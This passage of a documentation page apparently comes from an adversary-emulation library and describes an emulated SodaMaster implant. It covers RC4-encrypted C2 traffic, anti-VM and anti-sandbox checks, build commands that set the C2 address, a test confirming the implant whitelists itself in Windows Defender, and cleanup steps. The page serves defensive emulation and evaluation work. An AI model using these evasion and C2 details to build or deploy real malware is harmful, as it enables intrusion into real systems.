        <doc-anchor-trigger class="header-anchor-trigger" to="#rc4-encryption">#</doc-anchor-trigger>
        <span>RC4 Encryption</span>
    </h4>
</doc-anchor-target>
<p>Follwing the first packet all traffic between c2/impant is encrypted using RC4. The key is randomly generated and sent to the C2 server in the first RSA encrypted packet.</p>
<doc-anchor-target id="anti-vm-checks">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#anti-vm-checks">#</doc-anchor-trigger>
        <span>Anti-VM Checks</span>
    </h3>
</doc-anchor-target>
<p>Currently SodaMaster implements 5 anti-vm/anti-sandbox checks. The checks are listed out in more
detail below.</p>
<ul>
<li>Registry Checks
<ul>
<li><code v-pre>Applications\\VMwareHostOpen.exe</code></li>
</ul>
</li>
<li>Process Checks
<ul>
<li><code v-pre>vbox.exe</code></li>
<li><code v-pre>vmtoolsd.exe</code></li>
</ul>
</li>
<li>Check CPU cores &gt; 1</li>
<li>Check that time isnt being sped up on every logical loop.</li>
<li>Validate MSR reserved MSR ranges</li>
</ul>
<doc-anchor-target id="building-the-dll">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#building-the-dll">#</doc-anchor-trigger>
        <span>Building the DLL</span>
    </h3>
</doc-anchor-target>
<p>Open Powershell and move to the project source directory. From the project source directory  run the following command
to build the DLL.</p>
<p>Build with default arguemnts:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cmake .
cmake --build . --clean-first</code></pre>
</doc-codeblock></div>
<p>Build with custom arguments:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">cmake -D C2_PORT=&quot;4444&quot; -D C2_IP_ADDRESS=&quot;1.1.1.1&quot; -D DEBUG_MSG=0 .
cmake --build . --clean-first</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="testing">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#testing">#</doc-anchor-trigger>
        <span>Testing</span>
    </h3>
</doc-anchor-target>
<p>The SodaMaster integration test can be used to make sure that SodaMaster is executing properly in
a given environemnt. Currently the integration test will check the following:</p>
<ul>
<li>TCP connection to C2</li>
<li>Beacon packet sent to C2</li>
<li>SodaMaster path added to Windows Defender whitelist</li>
</ul>
<p>To use the integration test, the implant should be compiled with <code v-pre>127.0.0.1</code> as the C2 IP Address
and <code v-pre>9999</code> as the C2 Port.</p>
<p>Run the integration test:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">./integration_test.ps1</code></pre>
</doc-codeblock></div>
<p>Then run the implant.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">path/to/SodaMaster.exe</code></pre>
</doc-codeblock></div>
<p>The integration test window will provide prompts based on the results of the integration test.</p>
<doc-anchor-target id="cleanup-instructions">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cleanup-instructions">#</doc-anchor-trigger>
        <span>Cleanup Instructions</span>
    </h3>
</doc-anchor-target>
<p>Use the <code v-pre>cleanup.ps1</code> script to remove all SodaMaster artifacts from disk. The script can be found here: <a href="scripts/cleanup.ps1">cleanup.ps1</a></p>
<doc-anchor-target id="cti-links">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cti-links">#</doc-anchor-trigger>
        <span>CTI Links</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" class="outbound" target="_blank"><span>Secure List</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="http://jsac.jpcert.or.jp/archive/2022/pdf/JSAC2022_9_yanagishita-tamada-nakatsuru-ishimaru_en.pdf" class="outbound" target="_blank"><span>JPCERT</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://media.kasperskydaily.com/wp-content/uploads/sites/86/2021/02/25140359/greatidea_A41_v1.0.pdf" class="outbound" target="_blank"><span>Kaspersky</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://www.trendmicro.com/ja_jp/research/21/l/Sigloader-by-Earth-Tengshe.html" class="outbound" target="_blank"><span>TrendMicro</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
<li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></li>
</ul>
<doc-anchor-target id="dependencies">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#dependencies">#</doc-anchor-trigger>
        <span>Dependencies</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="configuring-vcpkg--cryptopp">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#configuring-vcpkg--cryptopp">#</doc-anchor-trigger>
        <span>Configuring VCPKG + CryptoPP</span>
    </h4>
</doc-anchor-target>
<ol>
<li>Install vcpkg with these commands:
<ul>
<li><code v-pre>cd C:\</code></li>
<li><code v-pre>git clone https://github.com/Microsoft/vcpkg.git</code></li>
<li><code v-pre>cd vcpkg</code></li>
<li><code v-pre>./bootstrap-vcpkg.sh</code></li>
<li><code v-pre>./vcpkg integrate install</code></li>
<li>Set a system level environment variable named <code v-pre>VCKPG_ROOT</code> to the root of your installation directory. For example, <code v-pre>VCPKG_ROOT = C:\vcpkg</code>.</li>
</ul>
</li>
</ol>
<p>The projects dependencies (cryptopp) will now automatically be installed at build time.</p>
<doc-anchor-target id="troubleshooting">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#troubleshooting">#</doc-anchor-trigger>
        <span>Troubleshooting</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="anti-vm-exits">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#anti-vm-exits">#</doc-anchor-trigger>
        <span>Anti-VM Exits</span>
    </h4>
</doc-anchor-target>
<p>In most cases the AntiVM functions are wrapped in try/except statements allowing SodaMaster to continue execution if EDR
or some other application interferes with the AntiVM function. There are logs associated wih the AntiVM functions
that will let the operator know if a specific function failed or succeeded.</p>
<p>The MSRCheck is the only AntiVM check that isn&#x27;t surrounded with try/except since it depends on an error being thrown
as part of the check. The logging for this function is outside of the function. There will be a statement before
the function that logs the function start, if there is a following log it can be considered sucessful, if there isn&#x27;t
it should be treated as AntiVM triggered.</p>
<doc-anchor-target id="visual-studio">
    <h5>
        <doc-anchor-trigger class="header-anchor-trigger" to="#visual-studio">#</doc-anchor-trigger>
        <span>Visual Studio</span>
    </h5>
</doc-anchor-target>
<p>To execute the unit tests, thre are two options. The first option it to select <code v-pre>Build &gt; Build All</code> and execute the unit_tests.exe binary.
The second option is to select <code v-pre>Test &gt; Run CTests for SodaMaster</code>. Both options will execute all existing unit tests.</p>
<p>Current unit tests:</p>
<ul>
<li>RC4 Encryption</li>
<li>RC4 Decryption</li>
</ul>
<doc-anchor-target id="check-that-debug-strings-are-encrypted-in-the-binary">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#check-that-debug-strings-are-encrypted-in-the-binary">#</doc-anchor-trigger>
        <span>Check that debug strings are encrypted in the binary</span>
    </h4>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">strings .\sodamaster.exe | Select-String -Pattern &quot;REMOVE&quot;</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="start-a-listener-on-the-local-system-for-tcpcomms-testing">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#start-a-listener-on-the-local-system-for-tcpcomms-testing">#</doc-anchor-trigger>
        <span>Start a listener on the local system for TCP/Comms testing</span>
    </h4>
</doc-anchor-target>
<p>Open a powershell prompt and browse to the <code v-pre>scripts/</code> directory.</p>
<p>Import the poershell function using:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">. .\listener.ps1</code></pre>
</doc-codeblock></div>
<p>Start the listner in PowerShell:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">Start-listener -TCPPort 8080</code></pre>
</doc-codeblock></div>
<p>You can exit the listener at any time using <code v-pre>CTRL + C</code>.</p>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/menupass/resources/sigloader/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Sig​Loader Capability</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/oilrig/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Oil​Rig</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                    <g fill="currentColor">
                                                        <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                    </g>
                                                </svg>
                                                <span>ATTACK Evaluations Library GitHub</span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "SodaMaster", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
